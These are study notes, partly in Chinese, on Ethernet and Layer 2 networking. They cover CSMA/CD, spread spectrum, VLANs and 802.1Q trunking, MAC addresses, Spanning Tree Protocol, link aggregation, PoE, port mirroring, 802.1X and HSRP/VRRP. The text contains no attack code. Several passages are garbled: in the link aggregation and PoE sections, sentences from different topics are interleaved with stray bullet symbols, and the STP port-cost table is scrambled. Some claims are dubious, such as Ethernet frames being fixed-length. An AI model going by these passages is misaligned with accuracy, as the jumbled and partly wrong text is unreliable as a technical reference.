- Mid 1990s: tremendous competition between Ethernet, Token Ring, and Fiber Distributed Data Interface (FDDI).
- Today: Ethernet is the clear winner of those Layer 1 wars.
- Ethernet has evolved. Several Ethernet standards exist in modern LANs,
with different distance and speed limitations.
Principles of Ethernet
- Most successful local area networking technology of last 20 years.
  - The genesis of Ethernet was 1972, developed by Xerox Corporation.
Xerox Palo Alto Research Centers (PARC).
  - a technology allow computers to connect with laser printers.
  - Ethernet: use to interconnect devices as computers, printers, wireless
access points, servers, switches, routers, video-game systems... When a frame is transmitted on an Ethernet cable:
- an electrical impulse is sent through that cable
- received by other machines logically connected to that cable on the same local-area network (LAN).
- The portion of a local-area network that has the same logical connection is a network segment.
Ethernet. Link-layer protocol standardized IEEE 802.3
- Layer 2
  - Use 48 bit Mac address
- MTU Maximum transmission unit - 1500 bytes by default.
  - Max bytes in an individual frame. (Header+all data)
  - Can be change on devices.
  - But all devices on thet segement needs to be changed.
  - Ethernet provide no fragment or segment a frame
  - Betwenn segement, router can fragment frames
- IEEE - Institute of Electrical and Electronics Engineers standards
- In general, IEEE 802.3 = Ethernet.
  - some subtle distinctions.
  - Ethernet frame: a fixed-length frame.
  - IEEE 802.3 frame: length can vary.
- sends traffic to all nodes on a hub
- CSMA/CD
2 popular implementation of Ethernet before, but rarely seen today
network throughput(million (mega) bits per second):baseband:distance limitation x100 meters
- 10BASE5: thicknet.
  - 10: network throughput, 10 Mbps (10 million (mega) bits per second).
  - BASE: baseband, as opposed to broadband.
  - 5: distance limitation of 500 meters.
  - 10BASE5 networks, larger diameter than most types of media.  ⁃
 - 10BASE2: thinnet / cheapernet.
  - 2: distance limitation of 200 meters.(actual distance limitation: 185
meter)
  - thinner, less expensive than 10BASE5 cabling.  ⁃
 - 10BASE-T:
  - T: twisted-pair cabling.
  - in popularity with the advent of Unshielded twisted-pair cabling
(UTP)  ⁃
 CSMA/CD - Carrier Sense Multiple Access Collision Detect
- Ethernet: all networked devices should be eligible, at any time, to transmit on a network.
  - in opposition to technologies like
  - Token Ring
  - which boasted a deterministic media access approach.
  - passed a token around a network in a circular fashion, from one networked device to the next.
  - Only device was in possession of that token was eligible to
transmit on the network.   - bus topology.
  - a long cable (thicknet/thinnet) running the length of a building, networked devices tapping into cable to gain access to the network.
  - all devices are directly connected to the network, to transmit at any time (if they have reason to believe no other transmission currently exists on the wire).
  - But has to listen to the wire to see if there is currently any traffic being transmitted.
- If no traffic is detected, the networked device transmits its data.   - Only a single frame on a network segment at one time.
- simultaneously transmit
  - If they both listen to the wire at the same time.
  - They could simultaneously, erroneously, conclude they can send their
data.
  - When both devices simultaneously send their data, a collision occurs.
- Carrier sense multiple access Collision detect (CSMA/CD).
  - used by Ethernet.
  - determine if it is safe to transmit, detect collisions, and retransmit if necessary.
- Carrier sense:
  - A device attached to an Ethernet network. means that all nodes can
distinguish between an idle and a busy link.
  - Listen to the wire before transmit.
  - make sure a frame is not currently being transmitted on the network
segment.
- Multiple access:
  - Unlike a deterministic method of network access (Token Ring), all
Ethernet devices simultaneously have access to an Ethernet segment. - Collision detect:   - detect when a frame it is transmitting has collided with a frame transmitted by another node.
  - After the devices notice a collision occurred.
  - They independently set a random back off timer.
  - After each device’s random timer expires, each devicetransmit its data
again.
  - Back off timer:
  - Each device almost certainly picked a different back off time.
  - Their transmissions should not collide the next time.
  - Even with CSMA/CD, Ethernet segments still have scalability
limitations.
  - All devices on a shared Ethernet segment are same collision domain.
  - More devices, the likelihood of collisions increases.   - Example:
  - 10BASE5/2 network with multiple devices attaching to the same cable:
  - On that cable, only one device can transmit at any one time.
  - all devices attached to the cable are in the same collision
domain.
- Uses ALOHA (packet radio network) as the root protocol
  - Developed at the University of Hawaii to support communication
across the Hawaiian Islands.
  - For ALOHA the medium was atmosphere,
  - for Ethernet the medium is a coax cable.
- DEC and Intel joined Xerox to define a 10-Mbps Ethernet standard in 1978.
- This standard formed the basis for IEEE standard 802.3
- Recently 802.3 has been extended to include a 100-Mbps version (Fast Ethernet) and a 1000-Mbps version (Gigabit Ethernet).
- devices connected to an Ethernet
- hub:
  - Hub: Layer 1 device
  - does not make forwarding decisions.
  - takes bits in on one port and sends out all the other hub ports, other
than the port on which the bits were received.   - devices are all in the same collision domain. - Ethernet switches
  - increase the scalability of Ethernet networks by creating multiple collision domains.
  - Single port connecting to single device
  - every port on an switch is one collision domain.
  - With no chance of collision, CSMA/CD can be turned off.
  - network devices can operate in full-duplex mode. (not half-duplex
mode)
- turning off CSMA/CD:
  - networked devices can then operate in full-duplex mode
  - devices can transmit and receive traffic at the same time (different
wires within a cable are used for transmitting and receiving)
  - more efficient of network bandwidth, as opposed to half-duplex
communication.
  - When multiple devices are connected to the same shared Ethernet
segment:
- CSMA/ CD must be enabled.
  - the network must be operating in a half-duplex mode,
  - a networked device can only transmit or receive at anyone time.
  - cannot simultaneously transmit and receive
  - cannot inefficient use network’s bandwidth.
Distance and Speed Limitations
- bit: one of two possible values. using binary math (numbers of 0 and 1)
  - On a cable such as twisted-pair cable: a bit could be represented by
the absence or voltage.
- Fiber-optic cables: represent a bit with the absence or presence of light.
- bandwidth: how many bits the network can transmit during a 1-second period of time.
  - 10 Mbps, megabits (millions of bits) per second.
  - has the capacity to transmit 10,000,000 (10 million) bits in a 1-second
period of time Ethernet Type: - Standard Ethernet: 10 Mbps: 10 million bits per second (10 megabits per second)
- FastEthernet (FE): 100 Mbps: 100 million bits per second (100 megabits per second)
- Gigabit Ethernet: 1 Gbps: 1 billion bits per second (1 gigabit per second)
- 10-Gigabit Ethernet: 10 Gbps: 10 billion bits per second (10 gigabits per second)
- 100-Gigabit Ethernet: 100 Gbps: 100 billion bits per second (100 gigabits per second)
- Cable type:
◦ influences the bandwidth capacity
◦ influences the distance limitation of your network.
◦ example:
▸ fiber-optic cabling often has a higher bandwidth capacity and a longer
distance limitation than twisted- pair cabling.
▸ Because of the issue of multimode delay distortion, single-mode fiber (SMF)
usually has a longer distance limitation than multimode fiber (MMF).
- uplink one switch to another, you might need different connectors (example, MMF, SMF, or UTP) for different installations.
- some Ethernet switches have one or more empty slots in which you can insert a Gigabit Interface Converter (GBIC).
▸ interfaces that have a bandwidth capacity of 1 Gbps and are available with MMF, SMF, or UDP connectors.
▸ This allows you to have flexibility in the uplink technology you use in an Ethernet switch.
▸ mini-GBIC / small form-factor pluggable (SFP): A variant of a regular GBIC, which is smaller.
- listing of multiple Ethernet standards, along with their media type, bandwidth capacity, and distance limitation.
- 100BASE-T: is not a specific standard.
- 100BASE-T: is a category of standards,
◦ 100BASE-T2 (uses 2 pairs of wires in Cat 3 cable) and 100BASE-T4 (which
uses four pairs of wires in a Cat 3 cable). (No longer used) ▪


## ◦ 100BASE-TX.
- Therefore, you can generally use the 100BASE-T and 100BASE-TX terms interchangeably.
- 1000BASE-X: is not a specific standard, refers to all Ethernet technologies that transmit data at a rate of 1 Gbps over fiber-optic cabling.
CSMA/CA
Ethernet’s - carrier sense multiple access collision detection (CSMA/CD).
WLANs - carrier sense multiple access collision avoidance (CSMA/CA).
  - CSMA/CD is needed for half-duplex Ethernet connections,
  - CSMA/CA is needed for WLAN connections, because of their half-duplex operation.
  - Ethernet device listens to an Ethernet segment to determine if a frame on the segment,
  - WLAN device listens for a transmission on a wireless channel to determine if it is safe to transmit.
  - the collision avoidance part causes wireless devices to wait for a random backoff time before transmitting.
Transmission Methods
the frequencies used for various wireless channels: those
 ▪


## frequencies are center frequencies of a channel.
In actual operation, a channel uses more than one
frequency, a transmission method, spread spectrum 頻谱 These frequencies are very close to one another,
results in a narrowband transmission.
The three variations of spread-spectrum 波谱
technology for study of WLANs:
Direct-sequence spread spectrum (DSSS) 直接序列展頻:
Modulates data over an entire range of frequencies
more subject to environmental factors, as opposed to FHSS and OFDM.
using a series symbols called chips.
  - A chip is shorter in duration than a bit
  - chips are transmitted at a higher rate than the actual data.
  - These chips encode the data to be transmitted, appears to be random data.
Both parties involved in a DSSS communication know which chips represent actual data and which chips do not,
if a third party intercepted a DSSS transmission, difficult to eavesdrop in on the data, not easily know
         ▪


## which chips represented valid bits.
Frequency-hopping spread spectrum (FHSS):
Allows the participants in a communication to hop between predetermined frequencies.
Security is enhanced
the participants can predict the next frequency to be used while a third party cannot easily predict the next frequency.
FHSS can also provision extra bandwidth by simultaneously using more than one frequency.
Orthogonal frequency division multiplexing (OFDM):
DSSS used a high modulation rate for the symbols it sends,
OFDM uses a relatively slow modulation rate for symbols.
  - slower modulation rate, combined with the simultaneous transmission of data over 52 data streams,
  - helps OFDM support high data rates while resisting interference between the various data streams.
Three wireless modulation techniques, only DSSS and OFDM are commonly used in today’s WLAN
       Ethernet Switch Features
- basic:
  - learns Media Access Control (MAC) addresses reside in which ports
  - makes forwarding decisions based on MAC
- many Layer 2 Ethernet switches offer a variety of other features:
  - enhance such things as network performance, redundancy, security,
management, flexibility, and scalability.
- basic switch configuration:
  - all ports belong to one broadcast domain.
  - broadcast gets forwarded out all other ports.
  - all devices connected in a broadcast domain have the same network
address, belong to same network, or subnet.
- Want to place PCs from different departments into their own subnet:
  - PCs of these departments are scattered across multiple floors in a
building.
  - Two departments each have a PC on both floors of a building
  - the wiring for each floor runs back to a wiring closet on that floor,
- design lacks efficiency:
 1之后，遍历整个网络并到达所有节点直至路由器。
仧 随着网络节点增加，开销的总数也在增⻓，直至影响交换机性能。 仧 通过实施VLAN断开广播域将数据流隔离开来，能够解决这一问题。
Virtual LANs (VLAN)
- to partition physical layer two segments into smaller, logically defined segments.
  - could be on the same physical switch,
  - or across several switches that are connected together.
- often see this in data centers or corporate LANs where traffic needs to be
separated for performance or policy reasons such as security.
- When create a VLAN
  - leave two separate LANs,
  - need a router to move data between the two VLANs, even if the
VLAN is on the same physical switch.
  - the switch could do the VLAN work
  - computer doesn't even know it's in a VLAN and no configuration is
required.
  - depend on network topology, may need to tell your switch what
VLAN you're participating in, so that it knows which layer 2 network to put your frame on, and that's where VLAN tagging comes in.
- 一组与位置无关的逻辑端口。VLAN相当于一个独立的三层网络。
- VLAN的成员无需局限于同一交换机的顺序或偶数端口。
- 1 switch: several ports, several VLAN or subnet,several broadcast domains. (logically separate), different subnets.
- Traffic need to be routed to pass between two VLANs. Different IP. 每一个VLAN相当于一个独立的三层IP网络
- 192.168.1.0上的节点试图与192.168.2.0上的节点通信时，不同VLAN通信必
须通过路由器，即使所有设备都连接到同一交换机。
仧 二层单播，多播和广播数据只会在同一VLAN内转发及泛洪，因此VLAN 1产
生的数据不会为VLAN 2节点所⻅。
仧 只有交换机能看得到VLAN，节点和路由器都感觉不到VLAN的存在。
仧 添加了路由决策之后，可以利用3层的功能来实现更多的安全设定，更多流
量以及负载均衡。
VLAN作用:
- 安全性:每一个分组的敏感数据需要与网络其他部分隔离开，减少保密信息
遭到破坏的可能性。
  - VLAN 10上的教职工主机完全与学生和访客数据隔离。
⁃
- 节约成本:无需昂贵的网络升级，并且带宽及上行链路利用率更加有效。
- 性能提高:将二层网络划分成多个逻辑工作组(广播域)减少网络间不必要
的数据流并提升性能。
- 缩小广播域:减少一个广播域上的设备数量。
  - 如上图所示:六台主机但有三个广播域:教职工，学生，访客。
- 提升IT管理效率:网络需求相似的用户共享同一VLAN，从而网络管理更为
简单。
  - 当添加一个新的交换机，在指定端口VLAN时，所有策略和步骤已配
 置好。
- 简化项目和应用管理:VLAN将用户和网络设备汇集起来，以支持不同的业
务或地理位置需求。
challenge with VLAN in large environments:
- need to configure identical VLAN information on all switches.
- Manually perform configuration: time consuming and error prone.
Trunks (IEEE 802.1Q) [switch to router]
- A more efficient connection,
- allow traffic for multiple VLANs to travel over a single connection
- carving a switch up into multiple VLANs:
- one port per VLAN, several switch ports could be consumed to connect a switch back to a router.
- Trunk在两个网络设备之间承载多于一种VLAN的端到端的连接，将VLAN 延伸至整个网络。
仧 没有VLAN Trunk，VLAN也不会非常有用。
- VLAN Trunk允许VLAN数据流在交换机间传输，所以设备在同一VLAN，
   但连接到不同交换机，能够不通过路由器来进行通信。
每一个VLAN对应于一个IP网络，因此，部署VLAN的时候必须结合考虑网络地址 层级的实现情况。  这种连接方式有问题。由于VLAN在连接端口的主机之间创建了三层边界，它们将 无法通信。
 ◆
交换机用满或同一管理单元物理上彼此分离的情形是很常⻅的。这种情况，VLAN 需要通过trunk延伸至相邻交换机。
- trunk能够连接交换机，在网络间传载VLAN信息。 仧 交换机间通过trunk线互连。
 - - switches from Cisco Systems support VLAN Trunking Protocol (VTP)
  - allows a VLAN created on one switch to be propagated to other switches in
a group of switches (a VTP domain).
  - VTP information is carried over a trunk connection,
You'll need to configure your network interface with the value. 802. 1Q tagging
with that, your switch will know which VLAN your traffic is destined for.
Since your computer/switch is putting the VLAN tag into the layer two Ethernet frame, the switch will intelligently put that tagged frame onto the correct VLAN, and from here, routing is no different than the regular routing of IP packets.
The computer determined that the destination IP is on a remote network and sends the packet to the default gateway for that segment or VLAN.
当安装好trunk线之后，帧在trunk线传输可以使用trunk协议来修改以太网帧。 仧 意味着交换机端口有不止一种操作模式。
仧 缺省情况下，所有端口都称为接入端口。
仧 当一个端口用于交换机间互连传输VLAN信息时，这种端口模式改变为
trunk，节点也路由器通常不知道VLAN的存在并使用标准以太网帧或
“untagged”帧。
- trunk线能够使用“tagged”帧来标记VLAN或优先级。
仧 在trunk端口，运行trunk协议来允许帧中包含trunk信息。
 PC 1在经过路由表处理后向PC 2发送数据流。在同一VLAN但不同交换机。 仧 以太网帧离开PC 1到达Switch 1。
- Switch 1的SAT表明目的地是trunk线的另一端。 - Switch 1使用trunk协议在以太网帧中添加VLAN id。 仧 新帧离开Switch 1的trunk端口被Switch 2接收。
- Switch 2读取trunk id并解析trunk协议。
仧 源帧按照Switch 2的SAT转发至目的地(端口4)。
VLAN tag如下图所示，包含类型域，优先级域，CFI(Canonical Format Indicator)指示MAC数据域，VLAN ID。
 IEEE 802.1Q/ dot1q.
- The most popular trunking standard today
- One of the VLANs traveling over an trunk is called a native VLAN.
  - Frames belonging to the native VLAN are sent unaltered over the trunk.
- To distinguish other VLANs from one another, the remaining non-native VLANs are tagged. Ethernet frame.
  - One of these bytes contains a VLAN field (indicates to which VLAN
a frame belongs.)
- The devices (a switch/router) at each end of a trunk interrogate that field to
determine to which VLAN an incoming frame is associated.
- VLAN and trunking features allow switch ports to be used far more
efficiently than merely relying on a default switch configuration.
Media Access Control (MAC) Addresses
Network interfaces are typically identified by a hardware-specific identifier: media access control address (MAC address).
48-bit identifier assigned to a network interface by its manufacturer.
usually represented by six pairs of hexadecimal digits, 00:16:B7:29:E4:7D, and every device that connects to a network has one.
  - the first 24 bits, identifying the organization that issued the MAC address (these prefixes are issued by IEEE).
  - Can identify the brand or model of a particular interface on a network.
  - the remaining 24 bits, manufacturer set to different model.
  - 224 = 16, 777, 216 possibilities for 24 bits, even manufacturer reusing MAC addresses, the chance of two devices on the same network having the same manufacturer-assigned MAC address is on the order of a one-in-a-million.
MAC addresses are used in the link layer to identify the devices in a network, intended to be unique for each interface. Despite the fact that they are designed to be unique identifiers, MAC addresses can be changed by software through the driver of the network interface.
Network administrators can use this functionality to issue their own MAC addresses to network interfaces on their network.
These locally administered MAC addresses are distinguished from MAC addresses issued by a manufacturer by a standardized identifier bit. the second-least-significant bit.
  - In a locally administered MAC address,this bit is 1,
  - In a manufacturer-issued MAC, this bit is 0.
Because MAC addresses can chang using software, they cannot be used as a
reliable means of identifying an untrusted source of network traffic.
MAC addresses are used at the link layer: facilitate the routing of frames to the correct destination.
switches learn the location of network devices from their MAC addresses and they forward frames based on this knowledge.
The format of an Ethernet frame:
Each frame contains its source and destination MAC addresses, a CRC-32 checksum: confirming data integrity,
  - a simple function of the frame, designed to catch transmission errors
  - if a 0 bit in the frame is accidentally changed to a 1 during transmission.
  - In particular, this checksum is not designed for strong authentication of device identities—it is not as secure as a digital signature. a payload section: contains data from higher layers, like the IP layer.
 Dealing with Collisions In the event of a collision, each of the transmitting machines waits a random amount of time, usually measured in microseconds, and then retransmits, to avoid a second collision.
If other collisions occur, then this process of randomly waiting and retransmitting is repeated.
The Ethernet protocol is designed so machine in a network segment will succeed in transmitting its frame.
Incidentally, this collision resolution protocol was originally needed even for two machines connected by a single (coaxial) cable, since such cables are not bidirectional,
but modern network cables can transmit data in both directions, so this collision resolution process only applies to network segments that contain more than two machines.
That is, two machines connected by a modern Ethernet cable can send and receive messages without accounting for the possibility of collisions.
But packet collisions can nevertheless become a major source of slowdown for local-area networks if there are larger numbers of machines logically connected to each other.
since it is not uncommon one network include several computers, printers, and at least one Wi-Fi access point. So even for a home network, it is useful to know how to connect machines to minimize collisions.
Spanning Tree Protocol (IEEE 802.1D) ▪


## https://www.jannet.hk/zh-Hans/post/spanning-tree-protocol-attack/
Administrators of corporate telephone networks often boast 自夸
about their telephone system (private branch exchange [PBX] system) having the five nines of availability (up and functioning 99.999% of the time).
  - about 5 minutes of downtime/year.
Developed by Radia Perlman at Digital
Spanning Tree protocol: use a set of bridges to agree upon a spanning tree for a particular extended LAN.
IEEE 802.1 specification for LAN bridges is based on this algorithm
Algorithm is dynamic
  - The bridges are always prepared to reconfigure themselves into a new spanning tree if some bridges fail
Main idea
■ Each bridge selects the ports over which they will or will not
forward the frames
it remove ports from the topology of the extended LAN to reduce an acyclic tree
It is even possible that an entire bridge will not participate in forwarding frames
Traditionally, corporate data networks compete with corporate voice networks.
  - Today, many networks that traditionally carried only data now carry voice, video, and data.
  - Availability becomes even more important design consideration. Layer 2, many networks have redundant links between switches to
improve network availability.
Unlike Layer 3 packets, Layer 2 frames lack a Time- to-Live (TTL) field.
  - A Layer 2 frame can circulate endlessly through a looped Layer 2 topology.
  - Fortunately, IEEE 802.1D, Spanning Tree Protocol (STP) allows a network to physically have Layer 2 loops while strategically blocking data from flowing over one or more switch ports to prevent the looping of traffic.
Before considering the operation of STP, let’s think about what could happen in the absence of STP or what could happen if the STP
       process on a switch failed. Two significant symptoms include corruption of a switch’s MAC address table and broadcast storms.
extended LAN represented by graph may has loops (cycles).
A Spanning Tree is a sub-graph of this graph that covers all the vertices but contains no cycles.
Spanning tree keeps all the vertices of the original graph but throws out some of the edges.
Example of (a) a cyclic graph; (b) a corresponding spanning tree.
 ■ Algorithm selects ports as follows:
■ Each bridge has a unique identifier: B1, B2, B3,...
■ Elect the bridge with the smallest id as the root of the spanning
tree.
■ Therootbridgeforwardsframesoutoverallofitsports.
■ Each bridge computes the shortest path to the root and notes
which of its ports is on this path.
■ This port is selected as the bridge’s preferred path to the root
■ Finally, all the bridges connected to a given LAN elect a single designated bridge that will be responsible for forwarding frames toward the root bridge.
Corruption of a Switch’s MAC Address Table
A switch’s MAC address table can dynamically learn what MAC addresses are available off of its ports.
However, in the event of an STP failure, a switch’s MAC address table can become corrupted. When PC1 sent frame to PC2, transmitted on segment A, the frame is on the Gig 0/1 ports of switches SW1 and SW2.
  - Both SW1 and SW2 switches add an entry to their MAC address tables associating a MAC address of AAAA.AAAA.AAAA with port Gig 0/1.
Because STP is not functioning, both switches forward the frame out on segment B.
  - As a result, PC2 receives two copies of the frame.
  - Switch 1 and 2 broadcast the frame.
switch SW1 sees the frame forwarded out from switch SW2’s Gig 0/2
port with source MAC address of AAAA. AAAA.AAAA,
switch SW2 sees the frame forwarded from switch SW1 on its Gig 0/2
port with source MAC address of AAAA. AAAA.AAAA. switch SW1 incorrectly updates its MAC address table
  - indicate MAC address of AAAA.AAAA.AAAA resides off of port Gig 0/2.
switch SW2 also incorrectly updates its MAC address table.
 Broadcast Storms
When a switch receives a broadcast frame (destined for MAC address FFFF.FFFF.FFFF), the switch floods the frame out of all switch ports (other than the port on which the frame was received).
Layer 2 frame does not have a Time- to-Live (TTL) field.
A broadcast frame endlessly circulates through the Layer 2 topology. Consuming resources on both switches and attached devices (like, user
PCs).
How a broadcast storm happened in Layer 2 topology when STP is not
functioning correctly:
  - PC1 sends a broadcast frame onto segment A,
  - the frame enters each switch on port Gig 0/1.
  - Both switches flood a copy of the broadcast frame out of their
Gig 0/2 ports, causing PC2 to receive two copies of the
broadcast frame.
  - Both switches receive a copy of the broadcast frame on their
Gig 0/2 ports and flood the frame out of their Gig 0/1 ports,
causing PC1 to receive two copies of the broadcast frame.
  - This behavior continues, as the broadcast frame copies continue
to loop through the network.
  - The performance of PC1 and PC2 are impacted, because they
also continue to receive copies of the broadcast frame.  STP Operation
prevents Layer 2 loops in a network (broadcast storm or corruption of a switch’s MAC address table).
Switches in an STP topology are classified:  Root bridge: lower bridge priorities value and lower MAC address
  - A switch elected to act as a reference point for a spanning tree.
  - When bridge priorities value are same, the switch with the lowest MAC address is the root bridge.
  - Bridge ID: BID = bridge priority value 優先序 + MAC address.
  - (2 bytes) (6 bytes)
  - 優先序預設值是32768，其二進位是1000 0000 0000 0000，十六進
位就是0x8000，其實也就是兩個bytes所能表達之數字範圍內的
中間值。公司设定的。 “0”的优先级最高。
  - Bridge Protocol Data Unit (BPDU):
  - interchange every 2 seconds.
  - Fields:
  - Root ID + Root Path Cose + Bridge ID + Maximum Age +
Hello Timer.
  - if the port down:
  - 20 sec: max-age timer
  - 15sec: listening
  - 15 sec: learning
  - No: forwarding.
Non-root bridge:
  - All other switches in the STP topology are considered to be
non-root bridges.
  - Ports that interconnect switches in an STP topology:
  - terms of cost:
  - ▸ Link speed(bandwidth) IEEE Specified Cost STP Port
Cost   -   -   -   - ⁃
▸ 10 gb/s ▸1gb/s
▸ 100mb/s ▸ 10mb/s
1 2
2 4 19 19 100 100
A new standard for STP port costs, called long STP, will be increasingly adopted over the coming years because of link speeds exceeding 10 Gbps. Long STP values range from 2,000,000 for 10-Mbps Ethernet to as little as 2 for 10 Tbps (that is, 10 trillion (tera) bits per second).
Designated port:
  - Every network segment has a single designated port
  - all ports on a root bridge.
  - the port that is closest to the root bridge, in terms of cost.
Root port:
  - Every non-root bridge has a single root port
  - the port on that switch that is closest to the root bridge, in terms
of cost.
Non-designated/block port:
  - block traffic to create a loop-free topology.
  - the port has lower Bridge ID.
  - Non-designated ports do not forward traffic during normal
operation, but do receive bridge protocol data units (BPDU):
  - If a link in the topology goes down, the non-designated port
detects the link failure, determines if it needs to transition to the forwarding state, through the following states:
the root port for switch SW2 is selected based on the lowest port ID, because the costs of both links are equal, each link has a cost of 19, the links are both Fast Ethernet links.  ⁃
the top link is running at a speed of 10 Mbps while the bottom link is running at a speed of 100 Mbps. Because switch SW2 seeks to get back to root bridge (SW1) with the least cost, port Gig 0/2 on SW2 is selected as the root port.
 ⁃
Blocking: remains +20 seconds by default.
  - During this time, the non-designated port evaluates BPDUs in
an attempt to determine its role in the spanning tree.
Listening: remains +15 seconds by default.
  - During this time, the port sources BPDUs, which inform
adjacent switches of the port’s intent to forward data.
Learning: remains +15 seconds by default.
  - During this time, the port begins to add entries to its MAC address table.
Forwarding:
  - The port moves to forwarding and begins to forward frames.
- Link Aggregation (802.3ad) 網路聚合 [switch to switch]
- If all ports on a switch are operating at the same speed (like 1 Gbps),
the most likely port(s) to experience congestion is port(s) connecting to another switch or router.
◦ Example:
▸ a wiring closet switch connected (via FastEthernet ports) to multiple PCs.
▸ That wiring closet switch has an uplink to the main switch for a building.
▸ This uplink port aggregates multiple 100-Mbps connections and is also operating at 100 Mbps
▸ If multiple PCs were transmitting traffic that needed to be sent over that uplink, it can quickly become congested.
- To help alleviate congested links between switches:
◦ link aggregation: logically combine multiple physical connections into a single logical connection, over which traffic can be sent.
- Although vendor-proprietary solutions for link aggregation have existed for sometime, a couple of common issues with some solutions included the following:
◦ ◦ •
◦ ◦ ▸ ▸ ◦
Each link in the logical bundle was a potential single point of failure. Each end of the logical bundle had to be manually configured.
The IEEE 802.3ad standard supports Link Aggregation Control Protocol (LACP).
•
- ◦
Power over Ethernet (802.3af) 乙太網路供電 Some switches:
not only transmit data over a connected UTP cable
In 2000, the IEEE ratified the 802.3ad standard for link aggregation. Unlike some of the older vendor-proprietary solutions
supports automatic configuration
prevents an individual link from becoming a single point of failure. Specifically, with LACP, if a link fails, that link’s traffic is forwarded
over a different link. ◦ - ◦ ▸ ▸
but they use that cable to provide power to an attached device. example,
install a wireless access point (AP) mounted to a ceiling.
Although no electrical outlet is available near the AP’s location, you can run a Cat 5 UTP plenum cable above the drop ceiling and
connect it to the AP.
▸ Some APs allow the switch at the other end of the UTP cable to
provide power over the same wires that carry data.
◦ receiving power from an Ethernet switch include security cameras and
IP phones.
•
◦
◦ ◦ •
◦ To check the resistance,
▸ the switch applies as much as 10 V of direct current 直流电流(DC) across specific pairs of wires (that is, pins 1 and 2 combine to form one side of the circuit, and pins 3 and 6 combine to form the other side of the circuit) connecting back to the attached device and checks to see how much current
flows 电流 over those wires.
▸ Then the switch concludes the attached device's resistance across those
wires based on E=IR.
▸ Voltage 电压(V) = Direct Current(DC) 电流(milliamps(mA)) x
Resistance 电阻(Ohms)
◦ The switch then must determine how much power the attached device
needs.
▸ The switch applying 电压 15.5 – 20.5 V DC (making sure that the current never exceeds 100 mA) to the attached device, for a brief period of time (less than one-tenth of a second).
▸ The amount of 电流 current flowing to the attached device tells the switch the power class of the attached device.
▸ The switch then knows how much power should be made available on the port connecting to the device requiring power, and it begins supplying an appropriate amount of voltage (in the range 44–57 V) to the attached device.
- Port Monitoring
- For troubleshooting, analyze packets flowing over the network.
Power over Ethernet (PoE) 802.3af:
The switch feature, provides power to attached devices
IEEE 802.3af standard: supply a maximum of 15.4 W (Watts) of power. IEEE 802.3at, offers to 32.4 W of power.
the PoE feature of a switch checks for 25k Ohms (25,000 Ohms) of resistance in the attached device. - To capture packets (store a copy of packets on a local hard drive) for analysis, you could:
◦ attach a network sniffer to a hub. Because a hub sends bits received on one port out all other ports, the attached network sniffer sees all traffic entering the hub.
◦ a low-cost: use software such as Wireshark (www. wireshark.org)
- A challenge arises, if you connect your network sniffer (like Wireshark) to a switch port rather than a hub port.
◦ a switch forwards frames out ports containing the frames’ destination addresses
◦ A network sniffer attached to one port would not see traffic destined for a device connected to a different port.
▸ Traffic enters a switch on port 1 and, based on the destination MAC addresses, exits via port 2.
▸ However, a network sniffer is connected to port 3 and is unable to see (and therefore capture) the traffic flowing between ports 1 and 2.
- Fortunately, some switches support a port mirroring feature:
◦ makes a copy of traffic seen on one port and sends that duplicated traffic out another port (to which a network sniffer could be attached).
◦ The switch is configured to mirror traffic from one port to another port.
◦ allows a network sniffer to capture the packets that need to be analyzed.
- User Authentication (802.1X)
- For security purposes, some switches might require users to authenticate themselves (provide credentials, such as a username and password, to prove who they are) before gaining access to the rest of the network.
- A standards-based method, enforcing user authentication is IEEE 802.1X.
◦ With 802.lX enabled
◦ a switch requires a client to authenticate before communicating on the network.
◦ After the authentication, a key is generated that is shared between the client and the device to which it attaches (like a wireless LAN controller or a Layer 2 switch).
◦ The key then encrypts traffic coming from and being sent to the client.
- User Authentication: three primary components of an 802.1X network:
▸ Supplicant: (PC) The device that wants to gain access to the network. ▸ Authenticator:(switch) - forwards the supplicant’s authentication request on to an authentication server.
- After the authentication server authenticates the supplicant, the authenticator receives a key that is used to communicate securely during a session with the supplicant.
▸ Authentication server:
- The authentication server (like a RADIUS server) checks a supplicant’s credentials.
- If the credentials are acceptable, notifies the authenticator that the supplicant is allowed to communicate on the network.
- gives the authenticator a key that can be used to securely transmit data during the authenticator’s session with the supplicant.
- Network Admission Control (NAC) feature:
◦ An even more sophisticated approach to admission control offered by some authentication servers.
▸ checking credentials
▸ + check characteristics of the device seeking admission to the network. - Like The client’s operating system (OS) and version of antivirus
software.
•
•
◦ If that router become unavailable,
◦ devices relied on the default gateway’s IP address would be unable to send traffic over local subnet.
- Fortunately, a variety of technologies are available for providing first- hop redundancy, first hop redundancy protocols FHRP 首跳冗余性协议包 括:
◦ Hot Standby Router Protocol (HSRP) 热备份路由器协议
▸ a Cisco proprietary protocol.
▸ HSRP can run on routers or multilayer switches.
▸ HSRP uses virtual IP and MAC addresses.
▸ Router 1, active router:
- services requests destined for the virtual IP and MAC addresses. ▸ Router 2, standby router:
- can service such requests in the event the active router becomes
unavailable.
▸ When R1 is active router, R2 is standby router.
◦ router.
First-Hop Redundancy Protocol (FHRP) 首跳冗余性协议 Many devices, such as PCs, are configured with a default gateway.
The default gateway parameter: identifies the IP address of a next-hop - When workstation A sends traffic destined for a remote network,
- workstation A sends traffic to its default gateway of 172.16.1.3 (IP address being serviced by HSRP.)
- R1 is active router, R1 does the work of forwarding the traffic off the local network.
- If router R1 becomes unavailable (Hello messages are no longer received from router R1)
- R2 transitions to an active router role.
- With default timer settings, the time required to fail over to router R2 is approximately 10 seconds. timers can be adjusted as little as 1 second.
◦ Virtual router redundancy protocol (VRRP) 虚拟路由冗余协议
▸ HSRP和VRRP的功能机制基本相同但只能实现网关备份，
- HSRP组内通常只放2台网关，1 active 1 standby，若不止两台，再添入
的网关都保持在初始状态(可以给备份做备份，但客户难以接受)
- VRRP中却有一台master和若干个backup。
▸ 备份组正常运行时active与standby之间默认间隔3秒相互发送hello包
(包含:active信息，standby信息，自身信息，认证口令，时间参数等信 息)(有点类似BPDU)(组播地址映射mac地址)以维护组内关系，而 master默认间隔一秒向外发送hello包，backup只接收不发送。
▸ standby的默认holdtime是3*3+1=10秒(可手动改)，backup的默认 holdtime=3*1+(skew)秒，其中skew=(256-priority)/256(取值范围0 到1，与优先级反比)。!!
- HSRP组中只有一台standby，holdtime到期后自觉上任，
- VRRP组中有多个backup，holdtime到期后并不要竞选出某一个去上 任，因为优先级最大的backup的holdtime最小!
▸ HSRP默认关闭抢占, VRRP默认开启.
- 抢占机制: 确保备份组中优先级最大的网关成为active/master(前提是 网关连接子网的接口没有出错，即可以向其他网关发送hello包)。
- 非抢占情况下: 备份网关收到active/master的hello包中更大的优先级也 不会去抢占它。给一副拓扑图:
